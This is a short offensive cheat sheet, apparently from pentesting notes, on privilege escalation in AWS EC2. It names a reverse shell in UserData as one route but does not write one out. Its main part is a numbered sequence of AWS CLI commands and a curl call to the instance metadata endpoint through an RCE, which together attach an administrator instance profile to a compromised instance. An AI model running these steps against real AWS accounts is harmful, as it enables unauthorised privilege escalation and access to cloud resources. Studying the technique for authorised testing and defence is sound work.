# AWS EC2 Privilege Escalation

### One approach to get a shell in an instance is to put a reverse shell in UserData attribute, when the instance is launched, we will have the connection.

### Another approach happens when we have the iam:PassRole and iam:AmazonEC2FullAccess permissions, we can add an administrator role to the compromised EC2 instance and access aws services.

## Steps:

#### 1) Getting information about the key

    aws sts get-caller-identity

#### 2) Getting policies attached to the IAM user

    aws iam list-attached-user-policies --user-name USER_NAME

#### 3) Getting information about a specific policy version

    aws iam get-policy-version --policy-arn ARN --version-id ID

#### 4) To attach a role to an EC2 instance, we can use the RCE to grab the ID

    curl http://169.254.169.254/latest/meta-data/instance-id

#### 5) Listing instance profiles

    aws iam list-instance-profiles

#### 6) Attach an instance profile to an EC2 instance

    aws ec2 associate-iam-instance-profile --instance-id ID --iam-instance-profile NAME
